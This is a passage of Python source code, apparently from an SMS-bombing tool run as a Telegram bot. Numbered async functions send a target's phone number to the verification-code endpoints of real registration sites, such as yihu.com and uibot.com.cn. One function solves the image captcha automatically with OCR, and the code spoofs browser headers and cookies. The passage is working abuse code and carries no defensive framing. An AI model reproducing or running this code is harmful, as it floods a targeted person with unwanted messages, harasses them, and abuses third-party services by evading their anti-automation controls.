        async with session.get(f"{url_yzm}?d={current_timestamp}&d={current_timestamp1}&d={current_timestamp2}", headers=headers_yzm) as response:
            image_data = await response.read()
            image = Image.open(BytesIO(image_data))
            ocr = ddddocr.DdddOcr()
            result = ocr.classification(image)
            print('验证码识别结果:', result)

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.yihu.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.yihu.com/Register/index',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        data = {
            'phoneNum': phone_number,
            'imgCode': result,
        }
        async with session.post(url_send_code, headers=headers, data=data) as response:
            result = await response.text()
            print('hz15', result)

# 异步版本的 hz16
async def hz16(phone_number):
    url = "https://account.uibot.com.cn/api/v2/register/code/send"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22%24device_id%22%3A%22194ab83c5541cb-00328d207c9f32-4c657b58-1821369-194ab83c555e64%22%7D',
        'sajssdk_2015_new_user_account_uibot_com_cn': '1',
        'sa_jssdk_2015_account_uibot_com_cn': '%7B%22distinct_id%22%3A%22194ab83c5541cb-00328d207c9f32-4c657b58-1821369-194ab83c555e64%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%8A%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fcn.bing.com%2F%22%7D%7D',
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'zh-CN',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://account.uibot.com.cn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://account.uibot.com.cn/view/register/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
    }
    json_data = {
        'accountName': phone_number,
    }
    async with aiohttp.ClientSession(cookies=cookies) as session:
        async with session.post(url, headers=headers, json=json_data) as response:
            result = await response.text()
            print('hz16', result)



#-----------------------------------------------------------------------------------------------------------------------------










#-----------------------------------------------------------------------------------------------------------------------------


#-----------------------------------------------------------------------------------------------------------------------------

# 启动轮询
bot.polling(non_stop=True, interval=0)
